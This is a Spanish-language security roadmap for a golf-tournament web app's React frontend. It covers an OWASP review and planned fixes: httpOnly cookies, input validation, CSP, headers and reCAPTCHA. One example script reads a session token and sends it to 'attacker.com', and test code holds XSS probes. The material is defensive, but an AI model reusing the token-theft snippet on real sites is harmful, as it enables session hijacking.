# 🗺️ Roadmap - RyderCupFriends Frontend

> **Versión:** 1.7.0
> **Última actualización:** 27 Nov 2025
> **Estado general:** ✅ Producción

---

## 📊 Resumen Ejecutivo

### ✅ Completado (v1.0.0 - v1.7.0)

| Componente | Estado | Descripción |
|-----------|--------|-------------|
| **Clean Architecture** | ✅ 100% | Domain, Application, Infrastructure, Presentation |
| **Testing** | ✅ 419 tests | 35 archivos, ~5s ejecución, cobertura 90%+ |
| **Autenticación** | ✅ Completo | Login, Register, Email Verification, JWT |
| **Competiciones** | ✅ Completo | CRUD, Estados, Transiciones, Browse |
| **Enrollments** | ✅ 90% | Domain + Application completo, UI pendiente |
| **Handicaps** | ✅ Completo | Manual + RFEG (validación por país) |
| **Sentry** | ✅ Operacional | Error tracking, Performance, Session Replay |
| **Performance** | ✅ Optimizado | Code splitting, Lazy loading (-95% bundle) |
| **React Auto-Escaping** | ✅ Nativo | XSS protection por defecto |

### 📈 Métricas Clave

- **419 tests pasando** (100% pass rate)
- **Bundle inicial:** 47 KB (reducido de 978 KB)
- **Páginas:** 11 rutas (5 públicas, 6 protegidas)
- **Cobertura de tests:** Domain 100%, Application 90%, Utils 100%

---

## 🔐 SEGURIDAD - Mejoras Prioritarias

> **Análisis OWASP Top 10 2021 completado:** 15 Dic 2025
> **Puntuación General:** 7.5/10 ✅
>
> **Estado de protecciones por categoría OWASP:**
>
> | Categoría OWASP | Puntuación | Estado | Prioridad |
> |-----------------|------------|--------|-----------|
> | **A01: Broken Access Control** | 6/10 | ⚠️ Parcial | 🔴 Crítica |
> | **A02: Cryptographic Failures** | 7/10 | ⚠️ Parcial | 🔴 Crítica |
> | **A03: Injection** | 8/10 | ✅ Bien | 🟠 Alta |
> | **A04: Insecure Design** | 8/10 | ✅ Bien | 🟠 Alta |
> | **A05: Security Misconfiguration** | 8.5/10 | ✅ Bien | 🟠 Alta |
> | **A06: Vulnerable Components** | 8/10 | ✅ Bien | 🟠 Alta |
> | **A07: Auth Failures** | 6.5/10 | ⚠️ Parcial | 🔴 Crítica |
> | **A08: Data Integrity** | 7/10 | ⚠️ Parcial | 🟡 Media |
> | **A09: Logging & Monitoring** | 9/10 | ✅ Excelente | 🟢 Baja |
> | **A10: SSRF** | 9/10 | ✅ N/A | 🟢 Baja |
>
> **Vulnerabilidades Críticas Detectadas:**
> 1. ❌ **Tokens en sessionStorage** - Vulnerable a XSS (A01, A02)
> 2. ❌ **No hay MFA/2FA** - Vulnerable a credential stuffing (A07)
> 3. ⚠️ **Password mínimo 8 caracteres** - OWASP recomienda 12 (A07)
> 4. ⚠️ **CSP con 'unsafe-inline'** - Permite scripts inyectados (A03)
> 5. ⚠️ **No hay logout por inactividad** - Sesiones activas indefinidamente (A07)
> 6. ⚠️ **No hay CAPTCHA** - Vulnerable a bots (A04, A07)
>
> **Protecciones Existentes (Fortalezas):**
> - ✅ **XSS (React):** Protegido (auto-escaping, no dangerouslySetInnerHTML)
> - ✅ **Validación de inputs:** Implementado con validation.js
> - ✅ **Security Headers:** HSTS, X-Frame-Options, CSP, Referrer-Policy
> - ✅ **Sentry:** Error tracking, performance monitoring, session replay
> - ✅ **Rate Limiting:** 5 intentos de login cada 5 minutos
> - ✅ **Email Verification:** Implementado correctamente
> - ✅ **Secretos:** Bien gestionado (.env, .gitignore correcto)
> - ✅ **Dependencias:** Actualizadas (React 18, Vite 7, Sentry 7.120)
>
> **Roadmap de Seguridad:**
> - 🔴 **v1.8.0 (3-4 semanas):** httpOnly cookies, password 12 chars, inactividad, CSP
> - 🟠 **v1.9.0 (2-3 meses):** 2FA/MFA, reCAPTCHA, device fingerprinting
> - 🟡 **v2.0.0 (6 meses):** Refresh tokens, audit logging, rate limiting avanzado

### 🔴 Prioridad CRÍTICA (v1.8.0 - Semana 1-2)

#### 1. Migrar a httpOnly Cookies (JWT Tokens)
**Estado:** ❌ **NO IMPLEMENTADO - CRÍTICO**
**Estimación:** 4-6 horas (frontend) + coordinación con backend
**Impacto:** Elimina robo de tokens via XSS

**Problema Actual:**
```javascript
// ❌ VULNERABLE: Tokens en sessionStorage
// src/utils/secureAuth.js
const TOKEN_KEY = 'auth_token';

export const setAuthToken = (token) => {
  sessionStorage.setItem(TOKEN_KEY, token);  // ← Accesible desde JavaScript
};

export const getAuthToken = () => {
  return sessionStorage.getItem(TOKEN_KEY);
};
```

**Vulnerabilidad XSS:**
```javascript
// Si un atacante inyecta este script:
const token = sessionStorage.getItem('auth_token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
// ← Token robado
```

**Solución:**

**Paso 1: Backend implementa httpOnly cookies (ver Backend ROADMAP)**
```python
# Backend ya debe estar implementado
response.set_cookie(
    key="access_token",
    value=token,
    httponly=True,   # ✅ No accesible desde JavaScript
    secure=True,     # ✅ Solo HTTPS
    samesite="lax",  # ✅ Protección CSRF básica
    max_age=3600
)
```

**Paso 2: Frontend migra a cookies automáticas**

**Archivos a ELIMINAR:**
- `src/utils/secureAuth.js` - **ELIMINAR COMPLETAMENTE**

**Archivos a MODIFICAR:**

1. **src/infrastructure/auth/ApiAuthRepository.js**
```javascript
// ANTES (❌ VULNERABLE)
async login(credentials) {
  const response = await fetch(`${API_URL}/api/v1/auth/login`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(credentials)
  });

  const data = await response.json();
  setAuthToken(data.access_token);  // ← Guardar en sessionStorage
  return data;
}

// DESPUÉS (✅ SEGURO)
async login(credentials) {
  const response = await fetch(`${API_URL}/api/v1/auth/login`, {
    method: 'POST',
    credentials: 'include',  // ✅ Envía/recibe cookies automáticamente
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(credentials)
  });

  const data = await response.json();
  // NO guardar token manualmente - navegador maneja cookie
  return data;
}
```

2. **src/infrastructure/user/ApiUserRepository.js**
```javascript
// ANTES (❌)
async getCurrentUser() {
  const token = getAuthToken();  // ← Leer desde sessionStorage

  const response = await fetch(`${API_URL}/api/v1/auth/current-user`, {
    headers: {
      'Authorization': `Bearer ${token}`  // ← Header manual
    }
  });

  return response.json();
}

// DESPUÉS (✅)
async getCurrentUser() {
  const response = await fetch(`${API_URL}/api/v1/auth/current-user`, {
    credentials: 'include',  // ✅ Cookie automática
    headers: {
      'Content-Type': 'application/json'
      // NO incluir Authorization header
    }
  });

  return response.json();
}
```

3. **src/infrastructure/competition/ApiCompetitionRepository.js**
```javascript
// Agregar credentials: 'include' a TODAS las requests
async getCompetitions() {
  const response = await fetch(`${API_URL}/api/v1/competitions`, {
    credentials: 'include'  // ✅ Agregar en todos los métodos
  });
  return response.json();
}

async createCompetition(competitionData) {
  const response = await fetch(`${API_URL}/api/v1/competitions`, {
    method: 'POST',
    credentials: 'include',  // ✅ Agregar en todos los métodos
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(competitionData)
  });
  return response.json();
}
```

4. **src/infrastructure/enrollment/ApiEnrollmentRepository.js**
```javascript
// Agregar credentials: 'include' a TODAS las requests
async requestEnrollment(enrollmentData) {
  const response = await fetch(`${API_URL}/api/v1/enrollments`, {
    method: 'POST',
    credentials: 'include',  // ✅ Agregar
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(enrollmentData)
  });
  return response.json();
}
```

5. **src/pages/Login.jsx**
```javascript
// ANTES (❌)
const handleSubmit = async (e) => {
  e.preventDefault();
  const data = await apiAuthRepository.login(credentials);
  setAuthToken(data.access_token);  // ← Guardar manualmente
  localStorage.setItem('user', JSON.stringify(data.user));
  navigate('/dashboard');
};

// DESPUÉS (✅)
const handleSubmit = async (e) => {
  e.preventDefault();
  const data = await apiAuthRepository.login(credentials);
  // NO guardar token - navegador maneja cookie automáticamente
  localStorage.setItem('user', JSON.stringify(data.user));
  navigate('/dashboard');
};
```

6. **src/pages/Register.jsx**
```javascript
// Mismo cambio que Login.jsx
const handleSubmit = async (e) => {
  e.preventDefault();
  const data = await apiAuthRepository.register(userData);
  // NO guardar token manualmente
  localStorage.setItem('user', JSON.stringify(data.user));
  navigate('/dashboard');
};
```

7. **src/pages/Dashboard.jsx (Logout)**
```javascript
// ANTES (❌)
const handleLogout = () => {
  removeAuthToken();  // ← Eliminar de sessionStorage
  localStorage.removeItem('user');
  navigate('/');
};

// DESPUÉS (✅)
const handleLogout = async () => {
  // Llamar a endpoint de logout para eliminar cookie en backend
  await fetch(`${API_URL}/api/v1/auth/logout`, {
    method: 'POST',
    credentials: 'include'
  });

  // Solo limpiar localStorage (user data)
  localStorage.removeItem('user');
  navigate('/');
};
```

**Archivos a Modificar (Resumen):**
- ❌ `src/utils/secureAuth.js` - **ELIMINAR**
- ✏️ `src/infrastructure/auth/ApiAuthRepository.js` - Agregar `credentials: 'include'`
- ✏️ `src/infrastructure/user/ApiUserRepository.js` - Agregar `credentials: 'include'`
- ✏️ `src/infrastructure/competition/ApiCompetitionRepository.js` - Agregar `credentials: 'include'`
- ✏️ `src/infrastructure/enrollment/ApiEnrollmentRepository.js` - Agregar `credentials: 'include'`
- ✏️ `src/pages/Login.jsx` - No guardar token manualmente
- ✏️ `src/pages/Register.jsx` - No guardar token manualmente
- ✏️ `src/pages/Dashboard.jsx` - Logout con llamada a backend

**Testing:**
```javascript
// Manual testing checklist
// 1. Login → Verificar que funciona sin sessionStorage
console.log(sessionStorage.getItem('auth_token')); // Debe ser null

// 2. Dashboard → Verificar que user data se carga
// 3. Logout → Verificar que cookie se elimina (DevTools → Application → Cookies)
// 4. Request protegido → Verificar que funciona (perfil, competiciones)
```

**Impacto:**
- ✅ Elimina robo de tokens via XSS (JavaScript no puede acceder)
- ✅ Simplifica código (menos manejo manual de tokens)
- ✅ 80% protección CSRF con `samesite=lax`

**Coordinación requerida:**
- ⚠️ **Backend debe estar implementado PRIMERO**
- Ver: Backend ROADMAP punto 3 (httpOnly Cookies)
- Ver: Frontend ADR-004 (httpOnly Cookies Migration)

---

#### 2. Prevención de XSS (Input Sanitization)
**Estado:** ⚠️ **PARCIAL** (React auto-escaping funciona, sanitización manual falta)
**Estimación:** 3-4 horas
**Impacto:** Defensa en profundidad contra XSS

**Estado Actual - Protecciones Existentes:**
```javascript
// ✅ React auto-escaping funciona
<h1>{user.name}</h1>  // ← Seguro, React escapa automáticamente

// ✅ No uso de dangerouslySetInnerHTML
// Auditoría completada: No se encontró dangerouslySetInnerHTML en el código

// ⚠️ Falta validación en frontend antes de enviar
<input
  value={competitionName}
  onChange={(e) => setCompetitionName(e.target.value)}
  // ← No hay validación aquí
/>
```

**Problemas a Resolver:**

1. **Inputs no sanitizados antes de enviar al backend**
2. **Sin validación de formatos (emails, URLs)**
3. **Sin límites de longitud en frontend**

**Solución:**

**Opción 1: Validación Manual (Sin librerías)**
```javascript
// src/utils/inputValidation.js (CREAR)
export const sanitizeHTML = (input) => {
  // Eliminar tags HTML básicos
  return input.replace(/<[^>]*>/g, '');
};

export const validateCompetitionName = (name) => {
  if (!name || name.trim().length < 3) {
    return 'Name must be at least 3 characters';
  }
  if (name.length > 100) {
    return 'Name must be less than 100 characters';
  }
  if (/<|>/.test(name)) {
    return 'Name cannot contain HTML tags';
  }
  return null; // Valid
};

export const validateEmail = (email) => {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return 'Invalid email format';
  }
  return null;
};
```

**Uso en Formularios:**
```javascript
// src/pages/CreateCompetition.jsx
import { validateCompetitionName, sanitizeHTML } from '../utils/inputValidation';

const CreateCompetition = () => {
  const [formData, setFormData] = useState({
    name: '',
    location: ''
  });
  const [errors, setErrors] = useState({});

  const handleChange = (e) => {
    const { name, value } = e.target;

    // Sanitizar mientras el usuario escribe
    const sanitized = sanitizeHTML(value);

    setFormData(prev => ({
      ...prev,
      [name]: sanitized
    }));

    // Validar en tiempo real
    if (name === 'name') {
      const error = validateCompetitionName(sanitized);
      setErrors(prev => ({
        ...prev,
        name: error
      }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Validar todo antes de enviar
    const nameError = validateCompetitionName(formData.name);
    if (nameError) {
      setErrors({ name: nameError });
      return;
    }

    // Enviar datos sanitizados
    await apiCompetitionRepository.createCompetition(formData);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        name="name"
        value={formData.name}
        onChange={handleChange}
        maxLength={100}  {/* Límite en HTML */}
      />
      {errors.name && <span className="text-red-600">{errors.name}</span>}

      <button type="submit" disabled={!!errors.name}>
        Create Competition
      </button>
    </form>
  );
};
```

**Opción 2: DOMPurify (Si se necesita sanitización avanzada)**
```bash
# Solo si se introduce rich text o HTML user-generated
npm install dompurify
```

```javascript
import DOMPurify from 'dompurify';

const sanitizedHTML = DOMPurify.sanitize(userInput);
```

**Archivos a Crear:**
- `src/utils/inputValidation.js` - Funciones de validación y sanitización

**Archivos a Modificar:**
- `src/pages/CreateCompetition.jsx` - Agregar validaciones
- `src/pages/Register.jsx` - Validar email, password
- `src/pages/EditProfile.jsx` - Validar nombres
- `src/pages/Login.jsx` - Validar formato de email

**Validaciones a Implementar por Formulario:**

| Página | Campo | Validación Requerida |
|--------|-------|---------------------|
| **Register** | email | Formato email, max 255 chars |
| **Register** | password | Min 8 chars, max 128 chars |
| **Register** | first_name | Min 1, max 50 chars, no HTML |
| **Register** | last_name | Min 1, max 50 chars, no HTML |
| **CreateCompetition** | name | Min 3, max 100 chars, no HTML |
| **CreateCompetition** | location | Min 3, max 200 chars, no HTML |
| **CreateCompetition** | max_players | Min 2, max 100 |
| **EditProfile** | first_name | Min 1, max 50 chars, no HTML |
| **EditProfile** | last_name | Min 1, max 50 chars, no HTML |

**Testing:**
```javascript
// tests/utils/inputValidation.test.js
import { validateCompetitionName, sanitizeHTML } from '../inputValidation';

describe('Input Validation', () => {
  test('rejects HTML tags', () => {
    const error = validateCompetitionName('<script>alert("xss")</script>');
    expect(error).toBeTruthy();
  });

  test('sanitizes HTML', () => {
    const input = '<b>Hello</b> World';
    const sanitized = sanitizeHTML(input);
    expect(sanitized).toBe('Hello World');
  });

  test('validates length', () => {
    const tooShort = validateCompetitionName('AB');
    expect(tooShort).toBeTruthy();

    const valid = validateCompetitionName('Valid Name');
    expect(valid).toBeNull();
  });
});
```

**Impacto:**
- ✅ Defensa en profundidad contra XSS (React + sanitización)
- ✅ Mejores mensajes de error para usuarios
- ✅ Prevención de datos inválidos en backend
- ✅ UX mejorada (validación en tiempo real)

---

### 🟡 Prioridad ALTA (v1.8.0 - Semana 3)

#### 3. Aumentar Contraseña Mínima a 12 Caracteres
**Estado:** ❌ **NO IMPLEMENTADO**
**Estimación:** 30 minutos
**Impacto:** Cumplir con estándares OWASP (A07:2021)
**OWASP:** A07:2021 - Identification and Authentication Failures

**Problema Actual:**
```javascript
// src/utils/validation.js:19
const minLength = 12; // Documentado como 12, pero validación acepta 8
```

**Solución:**
```javascript
// src/utils/validation.js:34-40
if (password.length < 12) {  // ← Cambiar de 8 a 12
  return {
    isValid: false,
    message: 'Password must be at least 12 characters',
    strength
  };
}
```

**Archivos a Modificar:**
- `src/utils/validation.js:34` - Cambiar mínimo de 8 a 12
- `src/pages/Register.jsx` - Actualizar mensaje de ayuda

**Impacto:**
- ✅ Cumple recomendación OWASP (12+ caracteres)
- ✅ Mayor seguridad contra brute force
- ⚠️ Usuarios existentes con passwords < 12 chars no afectados

---

#### 4. Implementar Logout por Inactividad
**Estado:** ❌ **NO IMPLEMENTADO**
**Estimación:** 2 horas
**Impacto:** Prevenir acceso no autorizado a sesiones abandonadas
**OWASP:** A07:2021 - Identification and Authentication Failures

**Problema Actual:**
- Sesiones no expiran por inactividad
- Usuario puede dejar sesión abierta indefinidamente

**Solución:**

**Crear custom hook:**
```javascript
// src/hooks/useInactivityLogout.js (CREAR)
import { useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { clearUserData } from '../utils/secureAuth';
import toast from 'react-hot-toast';

const INACTIVITY_TIMEOUT = 30 * 60 * 1000; // 30 minutos

export const useInactivityLogout = () => {
  const navigate = useNavigate();
  const timeoutRef = useRef(null);

  const resetTimer = () => {
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
    }

    timeoutRef.current = setTimeout(() => {
      clearUserData();
      toast.error('Session expired due to inactivity');
      navigate('/login', {
        state: { message: 'Your session has expired. Please log in again.' }
      });
    }, INACTIVITY_TIMEOUT);
  };

  useEffect(() => {
    const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];
    events.forEach(event => window.addEventListener(event, resetTimer));
    resetTimer();

    return () => {
      events.forEach(event => window.removeEventListener(event, resetTimer));
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
    };
  }, [navigate]);
};
```

**Usar en App.jsx:**
```javascript
// src/App.jsx
import { useInactivityLogout } from './hooks/useInactivityLogout';

function App() {
  const user = getCurrentUser();

  // Solo activar si usuario está logueado
  if (user) {
    useInactivityLogout();
  }

  return (
    <Router>
      {/* ... */}
    </Router>
  );
}
```

**Archivos a Crear:**
- `src/hooks/useInactivityLogout.js`

**Archivos a Modificar:**
- `src/App.jsx` - Agregar hook

**Testing:**
```bash
# Esperar 30 minutos sin actividad
# Debe redirigir a /login con mensaje
```

**Impacto:**
- ✅ Previene acceso no autorizado a sesiones abandonadas
- ✅ Cumple con mejores prácticas de seguridad
- ✅ Mejor UX con mensaje claro al usuario

---

#### 5. Implementar reCAPTCHA v3 en Login/Register
**Estado:** ❌ **NO IMPLEMENTADO**
**Estimación:** 3-4 horas
**Impacto:** Prevenir bots y credential stuffing
**OWASP:** A04:2021 - Insecure Design, A07:2021 - Authentication Failures

**Problema Actual:**
- No hay protección contra bots automatizados
- Rate limiting es insuficiente (puede ser bypasseado con múltiples IPs)
- Vulnerable a credential stuffing attacks

**Solución:**

**Paso 1: Obtener API keys de Google reCAPTCHA**
```bash
# Ir a: https://www.google.com/recaptcha/admin/create
# Seleccionar: reCAPTCHA v3
# Dominio: localhost, rydercupfriends.com
# Obtener: Site Key y Secret Key
```

**Paso 2: Configurar variables de entorno**
```bash
# .env
VITE_RECAPTCHA_SITE_KEY=your_site_key_here

# Backend .env (Secret Key)
RECAPTCHA_SECRET_KEY=your_secret_key_here
```

**Paso 3: Instalar librería**
```bash
npm install react-google-recaptcha-v3
```

**Paso 4: Configurar en App.jsx**
```javascript
// src/App.jsx
import { GoogleReCaptchaProvider } from 'react-google-recaptcha-v3';

function App() {
  return (
    <GoogleReCaptchaProvider
      reCaptchaKey={import.meta.env.VITE_RECAPTCHA_SITE_KEY}
      language="en"
    >
      <Router>
        {/* rutas */}
      </Router>
    </GoogleReCaptchaProvider>
  );
}
```

**Paso 5: Integrar en Login/Register**
```javascript
// src/pages/Login.jsx
import { useGoogleReCaptcha } from 'react-google-recaptcha-v3';

const Login = () => {
  const { executeRecaptcha } = useGoogleReCaptcha();

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Ejecutar reCAPTCHA
    if (!executeRecaptcha) {
      toast.error('reCAPTCHA not loaded');
      return;
    }

    const recaptchaToken = await executeRecaptcha('login');

    // Enviar token con credenciales
    const data = await loginUseCase.execute(
      formData.email,
      formData.password,
      recaptchaToken  // ← Agregar token
    );

    // ...
  };
};
```

**Paso 6: Validar en Backend**
```python
# Backend debe verificar token con Google
import requests

def verify_recaptcha(token: str, action: str = 'login') -> bool:
    secret = os.getenv('RECAPTCHA_SECRET_KEY')
    response = requests.post(
        'https://www.google.com/recaptcha/api/siteverify',
        data={
            'secret': secret,
            'response': token
        }
    )
    result = response.json()

    # Verificar score (0.0 - 1.0, recomendado >= 0.5)
    return result.get('success') and result.get('score', 0) >= 0.5
```

**Archivos a Modificar:**
- `src/App.jsx` - Agregar GoogleReCaptchaProvider
- `src/pages/Login.jsx` - Integrar reCAPTCHA
- `src/pages/Register.jsx` - Integrar reCAPTCHA
- `src/application/use_cases/user/LoginUseCase.js` - Pasar token a repository
- `src/infrastructure/repositories/ApiAuthRepository.js` - Enviar token al backend

**Archivos Backend a Modificar:**
- Backend debe implementar verificación de token

**Testing:**
```bash
# Login/Register debe funcionar normalmente
# Verificar en DevTools → Network que se envía 'g-recaptcha-response'
# Verificar score en backend logs
```

**Impacto:**
- ✅ Previene bots automatizados (99%)
- ✅ Protección contra credential stuffing
- ✅ Transparente para usuarios legítimos (v3 no requiere challenges)
- ⚠️ Requiere implementación en backend también

**Nota:** Implementar después de v1.8.0 (requiere coordinación con backend)

---

#### 6. Agregar Headers de Seguridad Adicionales
**Estado:** ⚠️ **PARCIAL**
**Estimación:** 30 minutos
**Impacto:** Mejorar protección contra ataques
**OWASP:** A05:2021 - Security Misconfiguration

**Headers Actuales:**
```javascript
// vite.config.js:8-13
const securityHeaders = {
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'Referrer-Policy': 'strict-origin-when-cross-origin',
  'Permissions-Policy': 'geolocation=(), microphone=(), camera=()',
}
```

**Headers Faltantes:**
```javascript
// vite.config.js:8-16 (ACTUALIZAR)
const securityHeaders = {
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'Referrer-Policy': 'strict-origin-when-cross-origin',
  'Permissions-Policy': 'geolocation=(), microphone=(), camera=()',
  'X-Permitted-Cross-Domain-Policies': 'none',       // ← NUEVO
  'Cross-Origin-Embedder-Policy': 'require-corp',    // ← NUEVO
  'Cross-Origin-Opener-Policy': 'same-origin',       // ← NUEVO
  'Cross-Origin-Resource-Policy': 'same-origin',     // ← NUEVO
}
```

**También actualizar:**
```
# public/_headers
/*
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: geolocation=(), microphone=(), camera=()
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Permitted-Cross-Domain-Policies: none
  Cross-Origin-Embedder-Policy: require-corp
  Cross-Origin-Opener-Policy: same-origin
  Cross-Origin-Resource-Policy: same-origin
  Content-Security-Policy: ...
```

**Archivos a Modificar:**
- `vite.config.js` - Agregar headers
- `public/_headers` - Agregar headers para producción

**Verificación:**
```bash
# Verificar en producción
curl -I https://rydercupfriends.onrender.com

# Verificar con herramienta online
# https://securityheaders.com
```

**Impacto:**
- ✅ Mejor protección contra Spectre/Meltdown (COOP/COEP)
- ✅ Prevenir cross-origin leaks
- ✅ Cumplir con mejores prácticas de seguridad

---

#### 7. Mejorar Content Security Policy (CSP)
**Estado:** ⚠️ **PARCIAL** (`unsafe-inline` presente)
**Estimación:** 2-3 horas
**Impacto:** Mejor protección contra XSS
**OWASP:** A03:2021 - Injection

**Problema Actual:**
```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'unsafe-inline';  ← ⚠️ VULNERABLE
               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;  ← ⚠️ VULNERABLE
               font-src 'self' https://fonts.gstatic.com;
               img-src 'self' data: https:;
               connect-src 'self' https://rydercup-api.onrender.com;
               frame-ancestors 'none';
               base-uri 'self';
               form-action 'self';" />
```

**Problema:** `'unsafe-inline'` permite que scripts inyectados se ejecuten.

**Solución: Eliminar `unsafe-inline` y usar hashes o nonces**

**Opción 1: CSP con Hashes (Estático - Más Simple)**
```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'sha256-{hash-del-script}';
               style-src 'self' 'sha256-{hash-del-estilo}' https://fonts.googleapis.com;
               font-src 'self' https://fonts.gstatic.com;
               img-src 'self' data: https:;
               connect-src 'self' https://rydercup-api.onrender.com https://*.ingest.us.sentry.io;
               frame-ancestors 'none';
               base-uri 'self';
               form-action 'self';" />
```

**Calcular hashes:**
```bash
# Obtener hash SHA-256 de inline scripts/styles
echo -n 'script content here' | openssl dgst -sha256 -binary | openssl base64
```

**Opción 2: CSP con Nonces (Dinámico - Más Seguro)**
```javascript
// vite.config.js - Plugin para inyectar nonces
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import crypto from 'crypto';

const noncePlugin = () => {
  return {
    name: 'vite-plugin-csp-nonce',
    transformIndexHtml(html) {
      const nonce = crypto.randomBytes(16).toString('base64');
      return html
        .replace(
          /<script/g,
          `<script nonce="${nonce}"`
        )
        .replace(
          /<style/g,
          `<style nonce="${nonce}"`
        )
        .replace(
          '{NONCE}',
          nonce
        );
    }
  };
};

export default defineConfig({
  plugins: [react(), noncePlugin()]
});
```

```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'nonce-{NONCE}';  ← Placeholder
               style-src 'self' 'nonce-{NONCE}' https://fonts.googleapis.com;
               font-src 'self' https://fonts.gstatic.com;
               img-src 'self' data: https:;
               connect-src 'self' https://rydercup-api.onrender.com https://*.ingest.us.sentry.io;
               frame-ancestors 'none';
               base-uri 'self';
               form-action 'self';" />
```

**Opción 3: CSP Solo en HTTP Headers (Render.com)**
```
# render.yaml o Render Dashboard → Headers
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://rydercup-api.onrender.com https://*.ingest.us.sentry.io; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
```

**Recomendación:** Empezar con Opción 3 (HTTP Headers) por simplicidad.

**Archivos a Modificar:**
- `index.html` - Eliminar meta tag CSP si se usa headers
- `render.yaml` - Agregar header CSP (crear archivo)
- `vite.config.js` - Solo si se usa nonces

**Verificación:**
```bash
# Verificar headers
curl -I https://rydercup.onrender.com

# Debe mostrar:
# Content-Security-Policy: default-src 'self'; script-src 'self'; ...
```

**Testing:**
```javascript
// Intentar inyectar script inline (debe fallar)
const script = document.createElement('script');
script.innerHTML = 'alert("xss")';
document.body.appendChild(script);
// ← CSP debe bloquear esto
```

**Impacto:**
- ✅ Elimina `unsafe-inline` (previene XSS inline)
- ✅ Solo permite scripts del mismo origen
- ✅ Sentry URLs permitidas para error tracking

---

#### 4. Auditoría de Secretos (Verificación)
**Estado:** ✅ **BIEN GESTIONADO** (verificar que se mantenga)
**Estimación:** 1 hora (auditoría)
**Impacto:** Mantener protección actual

**Estado Actual:**

✅ **Buenas prácticas implementadas:**
```javascript
// ✅ Variables de entorno
// .env
VITE_API_BASE_URL=http://localhost:8000
VITE_SENTRY_DSN=https://xxx@xxx.ingest.us.sentry.io/xxx
VITE_ENVIRONMENT=production

// ✅ .gitignore correcto
.env
.env.local
.env.production
.env.*.local

// ✅ Uso en código
const API_URL = import.meta.env.VITE_API_BASE_URL || 'http://localhost:8000';
```

**Auditoría Recomendada:**
```bash
# Buscar posibles secretos hardcodeados
cd /Users/agustinestevezdominguez/Documents/RyderCupWeb

# Buscar API keys hardcoded
grep -r "api_key" src/
grep -r "apiKey" src/
grep -r "secret" src/

# Buscar URLs hardcoded (deben estar en .env)
grep -r "http://" src/
grep -r "https://" src/

# Verificar que .env no está en git
git ls-files | grep ".env"
# ← Debe estar vacío
```

**Verificaciones:**
- [ ] No hay API keys hardcoded en src/
- [ ] No hay tokens hardcoded en src/
- [ ] Todas las URLs usan import.meta.env.VITE_*
- [ ] .env está en .gitignore
- [ ] .env.example existe con placeholders

**Si se encuentran secretos:**
```javascript
// ❌ INCORRECTO
const API_URL = 'https://api.rydercup.com';
const SENTRY_DSN = 'https://xxx@xxx.ingest.us.sentry.io/123456';

// ✅ CORRECTO
const API_URL = import.meta.env.VITE_API_BASE_URL;
const SENTRY_DSN = import.meta.env.VITE_SENTRY_DSN;
```

**Crear .env.example:**
```bash
# .env.example (CREAR si no existe)
VITE_API_BASE_URL=http://localhost:8000
VITE_SENTRY_DSN=your_sentry_dsn_here
VITE_ENVIRONMENT=development
VITE_APP_VERSION=1.7.0
```

**Impacto:**
- ✅ Mantener protección actual (excelente)
- ✅ Facilitar onboarding de nuevos desarrolladores (.env.example)
- ✅ Prevenir leaks de secretos en git

---

#### 5. Auditoría y Actualización de Dependencias
**Estado:** ⚠️ **REVISAR**
**Estimación:** 2-3 horas
**Impacto:** Prevención de vulnerabilidades conocidas

**Estado Actual:**
```json
// package.json (versiones aproximadas)
{
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "react-router-dom": "^6.20.0",
    "@sentry/react": "^7.91.0",
    "react-hot-toast": "^2.4.1"
  },
  "devDependencies": {
    "vite": "^5.0.8",
    "@vitejs/plugin-react": "^4.2.1",
    "tailwindcss": "^3.4.0",
    "vitest": "^1.0.4"
  }
}
```

**Proceso de Auditoría:**

**Paso 1: Auditar vulnerabilidades conocidas**
```bash
# Verificar vulnerabilidades con npm audit
npm audit

# Ver detalles de vulnerabilidades
npm audit --json

# Corregir automáticamente (revisar cambios)
npm audit fix

# Si hay breaking changes:
npm audit fix --force  # ⚠️ Revisar cuidadosamente
```

**Paso 2: Verificar dependencias desactualizadas**
```bash
# Listar dependencias desactualizadas
npm outdated

# Output ejemplo:
# Package             Current  Wanted   Latest
# react               18.2.0   18.2.0   18.3.1
# @sentry/react       7.91.0   7.91.0   8.5.0
```

**Paso 3: Actualizar dependencias críticas**
```bash
# Actualizar React y React DOM
npm install react@latest react-dom@latest

# Actualizar Vite
npm install -D vite@latest

# Actualizar Sentry (revisar breaking changes)
npm install @sentry/react@latest

# Actualizar todas las minor/patch (seguras)
npm update
```

**Paso 4: Testing después de updates**
```bash
# Correr tests
npm test

# Verificar build
npm run build

# Verificar dev server
npm run dev

# Verificar que la app funciona
# - Login/Logout
# - Crear competición
# - Navegación entre páginas
# - Sentry tracking
```

**Dependencias Críticas a Mantener Actualizadas:**

| Dependencia | Razón | Frecuencia de Revisión |
|-------------|-------|----------------------|
| **react** | Seguridad, performance | Mensual |
